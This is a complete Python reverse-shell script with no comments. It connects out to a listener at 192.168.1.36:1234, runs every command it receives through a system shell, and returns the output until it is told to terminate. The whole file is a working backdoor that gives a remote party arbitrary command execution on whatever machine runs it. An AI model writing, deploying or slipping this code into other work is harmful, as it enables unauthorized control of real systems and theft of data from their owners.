import socket, subprocess 
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("192.168.1.36",1234))
while True: 
    command = s.recv(1024) 
    command = command.decode('utf-8')
    if 'terminate' in command: 
        s.close()
        break
    else: 
        CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        s.send( CMD.stdout.read() ) 
        s.send( CMD.stderr.read() ) 
